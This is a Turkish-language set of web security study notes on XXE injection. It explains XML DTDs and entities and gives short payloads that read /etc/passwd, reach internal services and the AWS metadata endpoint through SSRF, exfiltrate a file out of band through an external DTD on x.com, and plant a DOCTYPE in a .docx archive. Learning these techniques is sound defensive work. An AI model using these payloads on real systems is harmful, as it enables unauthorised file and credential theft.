<h1 align="center">XXE Injection</h1>

## XML Nedir?
- Bir datayı export ederken ,structural tuttuğun bir veriyi, başka bir ortama taşırken kullandığın yapı formatı. (Web app olur)Servislerin ve programların veri alışverişinde kullandığı ortak bir dil. Günümüzün JSON’ı gibi.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/37423fd1-038c-4cfa-b3cf-7cbee0b85bfa)
- Uygulamaya dış dünyadan gelen veriler “*input*” ise başka bir web app.den gelen data da “input” tur.
    - XML’i aldığında parse etmesi lazım. Input validation için de parse etmesi lazım.
    - Bizim hedeflediğimiz kısım ise programlama dilinin parsing yaptığı kısım ve an.
- Bir uygulama XML input alıyorsa her zaman XXE’ye dokunur.
- Adam XML verisini SQL sorgusunda kullanıyor ise, SQLi aramaya devam et.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/fc138d1e-94e3-4642-8db8-9344ec22d0f2)
- XML’i parse edip DB’ye kaydedip, o verileri sana başka bir ekranda sunuyor ise burada Stored XSS bakabilirsin.
- XML için class oluşturur gibi DOCUMENT type oluşturuyorsun:
- DATABASEin tablosuna göre bir formatta yapı oluşturmuş oluyorsun.
```xml
<!DOCTYPE note
[
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
]>
```
Bu dökümanın tipi : note
Bu notun elementleri : to,from,heading,body
Bu elementlerin tipleri de str, int gibi şeyler olacak yanlarında yazıyor.

- Bu oluşturduğun dökümanı XML structure içine import edersen 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "Note.dtd"> --> Bu kısım import etmek (External Document Type Definition)
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend!</body>
</note>
```
- Bunu yapmak sana doğrudan bir "note" dökümanı(classı) oluşturabilmeni sağlıyor.
- <!DOCTYPE note SYSTEM "Note.dtd"> kısmında "Note.dtd" dosyasını gidip okuyor.
  - Yani bu demek oluyorki local sistem dosyalarından birini okutma kapasitesine sahibim.
- Bu adama string ifade vererek de XML document oluşturabilirsin sıkıntı olmaz:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [<!ELEMENT note (to,from,heading,body)]> 
```
- DTD içine "Entity" yazma olanağı sağlar. String ifadeler yazabilirsin yani.
```xml
<!ENTITY writer "Donald Duck.">
<!ENTITY copyright "Copyright W3Schools.">
XML example:
<author>&writer;&copyright;</author>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [<!ENTITY writer "Donald Duck."]> 
<note>
<to>&writer;</to> --> Donald Duck yazacak.
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend!</body>
</note>
```
- Entity nin güzel özelliklerinden biri SYSTEM operandına erişme özelliği barındırması.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [<!ENTITY writer SYSTEM "http://x.com/"]> yaptırtabiliyorsun. 
```
#### Web application senden XML requestini aldıktan ne yapıyor çokomelli!!! SQL sorgusu mu yapıyor başka bir şey mi yapıyor??

- Syntaxı bozarak error vermesini sağla, erroru geri dnüyor ise istediğin içeriği bu error’un içnide getirt. Error based SQLi gibi.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/0a75aa97-ffce-4314-9859-5599f46ee15c)
< Bu şekilde hata verecektir
- 2 yazan yere askfaskhjfasjk yazsan bile hatada sana bunu döndürdüğü için hackleyebildin.

- <!DOCTYPE note [<!ENTITY writer SYSTEM "file:///etc/passwd"]>
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/0b77b7ae-19ee-4bab-a716-a291ff861c77)
- <!DOCTYPE note [<!ENTITY writer SYSTEM "http://127.0.0.1:9002/"]>
    - Sunucu üstünde çalışan Elastic Searche http isteği ürettirebiliyorsun. SSRF zaafiyeti ortaya çıkıyor.
- http://169.254.169.254/latest/metadata  —> EC2 lar bu URL’e erişim imkanına sahip. Burada EC2’nun kritik bilgileri yatıyor. AWS kendi otomatik cevap dönüyor buradan.
- <!DOCTYPE note [<!ENTITY writer SYSTEM "http://127.0.0.1:9002/"]>
    - Sunucu üstünde çalışan Elastic Searche http isteği ürettirebiliyorsun. SSRF zaafiyeti ortaya çıkıyor.
- http://169.254.169.254/latest/metadata  —> EC2 lar bu URL’e erişim imkanına sahip. Burada EC2’nun kritik bilgileri yatıyor. AWS kendi otomatik cevap dönüyor buradan.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/de8bb36e-8710-4537-b7b2-b278aa65f67f)
- x.com’a gitse istek atsa ve oradan gelen cevap da XML olsa ve Web app. bunu işlemeye devam etse…
- txt yerine xml dosyası okuttuğunda <> işaretlerini tag olarak algılayacak ve hata verir muhtemelen. Encode özelliği olmadığı için encode da yapamazsın.

## XXE Out of Band
- x.com/test.dtd ’ye istek atıyor. x.com da bu web app.a istek atıyor ama 2 tane entity var.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/05a71c5e-b883-44d8-b183-3c9a8c9b1978)
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/056b3e27-de56-4169-915e-e0da406ebf2d)
settings.xml dosyasını “payl” değişkenine koyacak.
alttaki entityde tekarar x.com’a istek gönderecek parametresi de az önceki xlm dosyası olacak.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/478385bf-7be0-45b4-863f-6d96cd2f2e39)
XXE yi tespit etmek için şu satır yeterli. Burp collabrator client oluşşturdu onun URL’

#### Ekstra Notlar:
- bir web app .docx .xlst alıyorsa senden bunu parse etmek için “unzip” yapması gerekiyor. [Content_Types].xml dosyasına :
<!DOCTYPE foo [<!ENTITY xxe123 SYSTEM "http://127.0.0.1:8000/"]>
ekle sonra ziple tekrardan ve sunucuya yolla
- XLST parsing mevzusu var
